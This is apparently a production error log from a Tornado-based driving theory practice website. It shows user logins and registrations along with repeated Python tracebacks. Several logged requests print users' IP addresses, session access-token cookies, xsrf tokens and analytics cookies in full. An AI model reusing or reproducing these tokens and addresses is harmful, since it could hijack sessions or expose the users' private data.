INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
global name 'math' is not defined
WARNING:intheory-8002:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%2216.615869522094726%22%2C%2219.539995193481445%22%2C%2233.88231658935547%22%2C%2237.00679016113281%22%2C%2239.861419677734375%22%2C%2242.75815200805664%22%2C%2244.959537506103516%22%2C%2249.68397903442383%22%2C%2252.11855697631836%22%2C%2253.85405731201172%22%2C%2255.87241744995117%22%2C%2262.769073486328125%22%2C%2264.98180389404297%22%2C%2267.89373016357422%22%2C%2270.9250717163086%22%2C%2272.48243713378906%22%5D&cid=507493338e4c850ece772bc9&_xsrf=6e2e06c43619491193ea852e450e24a2', headers={'Content-Length': '499', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Cache-Control': 'no-cache', 'X-Real-Ip': '88.104.78.101', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bc9', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': 'access_token="S2FqYWw=|1350991112|fdf8d7b60313d70093e12df77ed44af7df1f1b83"; user_type="aW50aGVvcnk=|1350991112|1542f38080579b5b20a7fdfeaa7cd0b1c1069844"; _xsrf=6e2e06c43619491193ea852e450e24a2; __utma=188782963.1434025886.1350990256.1350990256.1350991633.2; __utmb=188782963.3.10.1350991633; __utmz=188782963.1350991633.2.2.utmcsr=search-results|utmccn=(organic)|utmcmd=organic|utmctr=driving%20hazard%20practice%20free; __utmc=188782963'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 14.87ms
Intheory user with id 508680148e4c85501c5038bc has successfully registered.
INFO:intheory-8003:Intheory user with id 508680148e4c85501c5038bc has successfully registered.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
Intheory user with id 5086820c8e4c85501c5038be has successfully registered.
INFO:intheory-8003:Intheory user with id 5086820c8e4c85501c5038be has successfully registered.
WARNING:root:404 GET /learn/hazard/clip//obj/video/intro.mp4 (127.0.0.1) 1.41ms
WARNING:root:404 GET /learn/hazard/clip//obj/video/intro.mp4 (127.0.0.1) 0.46ms
WARNING:root:404 GET /learn/hazard/clip//obj/video/intro.mp4 (127.0.0.1) 1.23ms
WARNING:root:404 GET /learn/hazard/clip//obj/video/intro.mp4 (127.0.0.1) 1.26ms
WARNING:root:404 GET /learn/hazard/clip//obj/video/intro.mp4 (127.0.0.1) 0.80ms
WARNING:root:404 GET /learn/hazard/clip//obj/video/intro.mp4 (127.0.0.1) 0.85ms
Intheory user with id 5086820c8e4c85501c5038be has successfully logged in.
INFO:intheory-8002:Intheory user with id 5086820c8e4c85501c5038be has successfully logged in.
WARNING:root:404 GET /learn/hazard/clip//obj/video/intro.mp4 (127.0.0.1) 0.87ms
WARNING:root:404 GET /learn/hazard/clip//obj/video/intro.mp4 (127.0.0.1) 1.25ms
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 508682a08e4c85500b6cc28e has successfully logged in.
INFO:intheory-8002:Facebook user with id 508682a08e4c85500b6cc28e has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 508682a08e4c85500b6cc28e has successfully logged in.
INFO:intheory-8003:Facebook user with id 508682a08e4c85500b6cc28e has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Intheory user with id 508683488e4c85501c5038c3 has successfully registered.
INFO:intheory-8003:Intheory user with id 508683488e4c85501c5038c3 has successfully registered.
'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:intheory-8000:'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:root:500 POST /login/intheory?next=/payment (127.0.0.1) 10.13ms
'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:intheory-8003:'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:root:500 POST /login/intheory?next=/dashboard (127.0.0.1) 10.83ms
'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:intheory-8003:'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:root:500 POST /login/intheory?next=/payment (127.0.0.1) 6.92ms
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 5086840d8e4c85500b6cc292 has successfully logged in.
INFO:intheory-8000:Facebook user with id 5086840d8e4c85500b6cc292 has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Intheory user with id 5086842b8e4c85501c5038c7 has successfully registered.
INFO:intheory-8003:Intheory user with id 5086842b8e4c85501c5038c7 has successfully registered.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 5086842e8e4c855002dbfdc6 has successfully logged in.
INFO:intheory-8003:Facebook user with id 5086842e8e4c855002dbfdc6 has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:intheory-8001:'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:root:500 POST /login/intheory?next=/dashboard (127.0.0.1) 6.86ms
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 144, in _save_user_profile
    c_user.username = response['username']
KeyError: 'username'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 167, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'fb_id'])
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Intheory user with id 508684ee8e4c85500b6cc296 has successfully registered.
INFO:intheory-8002:Intheory user with id 508684ee8e4c85500b6cc296 has successfully registered.
global name 'math' is not defined
WARNING:intheory-8000:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%225.9025983810424805%22%2C%2210.239460945129394%22%2C%2218.2110595703125%22%2C%2231.33909797668457%22%2C%2235.958465576171875%22%2C%2245.31969451904297%22%5D&cid=507493338e4c850ece772bc9&_xsrf=b65b48afdb3c4fd494aace7a3e2c0237', headers={'Content-Length': '237', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Ua-Cpu': 'AMD64', 'Cache-Control': 'no-cache', 'X-Real-Ip': '82.38.83.174', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bc9', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': '_xsrf=b65b48afdb3c4fd494aace7a3e2c0237; access_token=bGlzYWdyZWVu|1350992939|4ab800940ed2cfdd234b4eea70aa254a0e76ed3f; user_type="aW50aGVvcnk=|1350992939|9a4b187c5f1fc3be4d12c748ce8ebe16ea779cfc"; __utma=188782963.1765502030.1350992799.1350992799.1350992799.1; __utmb=188782963.17.10.1350992799; __utmc=188782963; __utmz=188782963.1350992799.1.1.utmcsr=conduit|utmccn=(organic)|utmcmd=organic|utmctr=theorytest%20co%20uk'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 25.78ms
Intheory user with id 508685198e4c85501c5038cf has successfully registered.
INFO:intheory-8003:Intheory user with id 508685198e4c85501c5038cf has successfully registered.
Intheory user with id 508685568e4c85500b6cc298 has successfully registered.
INFO:intheory-8002:Intheory user with id 508685568e4c85500b6cc298 has successfully registered.
global name 'math' is not defined
WARNING:intheory-8002:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%224.999000072479248%22%2C%229.13599967956543%22%2C%2213.302000045776367%22%2C%2236.49399948120117%22%2C%2242.69200134277344%22%2C%2245.47700119018555%22%2C%2257.1349983215332%22%5D&cid=507493338e4c850ece772bc9&_xsrf=e404e179442b43578c36e8cc1065ef7b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '260', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bc9', 'X-Real-Ip': '78.146.213.204', 'Cookie': '_xsrf=e404e179442b43578c36e8cc1065ef7b; access_token=a2F5YWx2aWx5|1350993177|b0fb385d581b10118bd60feeffbac89dc9efe4c6; user_type="aW50aGVvcnk=|1350993177|f4c8eb0fc7c35c443c1d7145ec346392cdc53b51"; __utma=188782963.651186145.1350993055.1350993055.1350993055.1; __utmb=188782963.9.10.1350993055; __utmc=188782963; __utmz=188782963.1350993055.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=practical%20hazard%20perception%20test', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 14.97ms
global name 'math' is not defined
WARNING:intheory-8001:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%2249.970088958740234%22%2C%2253.86913299560547%22%2C%2265.25617218017578%22%5D&cid=507493338e4c850ece772bca&_xsrf=b65b48afdb3c4fd494aace7a3e2c0237', headers={'Content-Length': '158', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Ua-Cpu': 'AMD64', 'Cache-Control': 'no-cache', 'X-Real-Ip': '82.38.83.174', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bca', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': '_xsrf=b65b48afdb3c4fd494aace7a3e2c0237; access_token=bGlzYWdyZWVu|1350992939|4ab800940ed2cfdd234b4eea70aa254a0e76ed3f; user_type="aW50aGVvcnk=|1350992939|9a4b187c5f1fc3be4d12c748ce8ebe16ea779cfc"; __utma=188782963.1765502030.1350992799.1350992799.1350992799.1; __utmb=188782963.28.10.1350992799; __utmc=188782963; __utmz=188782963.1350992799.1.1.utmcsr=conduit|utmccn=(organic)|utmcmd=organic|utmctr=theorytest%20co%20uk'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 19.10ms
Intheory user with id 508685a88e4c85500b6cc29b has successfully registered.
INFO:intheory-8002:Intheory user with id 508685a88e4c85500b6cc29b has successfully registered.
Facebook user with id 508684d28e4c85501c5038cd has successfully logged in.
INFO:intheory-8003:Facebook user with id 508684d28e4c85501c5038cd has successfully logged in.
Facebook user with id 508684d28e4c85501c5038cd has successfully logged in.
INFO:intheory-8002:Facebook user with id 508684d28e4c85501c5038cd has successfully logged in.
global name 'math' is not defined
WARNING:intheory-8000:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%224.763000011444092%22%2C%228.84000015258789%22%2C%2210.196000099182129%22%2C%2211.866000175476074%22%2C%2213.795000076293945%22%2C%2236.321998596191406%22%2C%2237.12699890136719%22%2C%2239.98500061035156%22%5D&cid=507493338e4c850ece772bc9&_xsrf=e404e179442b43578c36e8cc1065ef7b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '290', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bc9', 'X-Real-Ip': '78.146.213.204', 'Cookie': '_xsrf=e404e179442b43578c36e8cc1065ef7b; access_token=a2F5YWx2aWx5|1350993177|b0fb385d581b10118bd60feeffbac89dc9efe4c6; user_type="aW50aGVvcnk=|1350993177|f4c8eb0fc7c35c443c1d7145ec346392cdc53b51"; __utma=188782963.651186145.1350993055.1350993055.1350993055.1; __utmb=188782963.11.10.1350993055; __utmc=188782963; __utmz=188782963.1350993055.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=practical%20hazard%20perception%20test', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 15.26ms
global name 'math' is not defined
WARNING:intheory-8001:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%2212.671401977539062%22%2C%2227.795738220214843%22%2C%2246.65167999267578%22%5D&cid=507493338e4c850ece772bcb&_xsrf=b65b48afdb3c4fd494aace7a3e2c0237', headers={'Content-Length': '159', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Ua-Cpu': 'AMD64', 'Cache-Control': 'no-cache', 'X-Real-Ip': '82.38.83.174', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bcb', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': '_xsrf=b65b48afdb3c4fd494aace7a3e2c0237; access_token=bGlzYWdyZWVu|1350992939|4ab800940ed2cfdd234b4eea70aa254a0e76ed3f; user_type="aW50aGVvcnk=|1350992939|9a4b187c5f1fc3be4d12c748ce8ebe16ea779cfc"; __utma=188782963.1765502030.1350992799.1350992799.1350992799.1; __utmb=188782963.30.10.1350992799; __utmc=188782963; __utmz=188782963.1350992799.1.1.utmcsr=conduit|utmccn=(organic)|utmcmd=organic|utmctr=theorytest%20co%20uk'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 13.92ms
global name 'math' is not defined
WARNING:intheory-8001:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%2212.515999794006348%22%2C%2219.576000213623047%22%2C%2236.98699951171875%22%2C%2252.33399963378906%22%2C%2253.577999114990234%22%2C%2259.28200149536133%22%5D&cid=507493338e4c850ece772bca&_xsrf=e404e179442b43578c36e8cc1065ef7b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '238', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bca', 'X-Real-Ip': '78.146.213.204', 'Cookie': '_xsrf=e404e179442b43578c36e8cc1065ef7b; access_token=a2F5YWx2aWx5|1350993177|b0fb385d581b10118bd60feeffbac89dc9efe4c6; user_type="aW50aGVvcnk=|1350993177|f4c8eb0fc7c35c443c1d7145ec346392cdc53b51"; __utma=188782963.651186145.1350993055.1350993055.1350993055.1; __utmb=188782963.13.10.1350993055; __utmc=188782963; __utmz=188782963.1350993055.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=practical%20hazard%20perception%20test', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 14.80ms
intro is not a valid ObjectId
WARNING:intheory-8003:intro is not a valid ObjectId
ERROR:root:Uncaught exception POST /learn/hazard/evaluate (127.0.0.1)
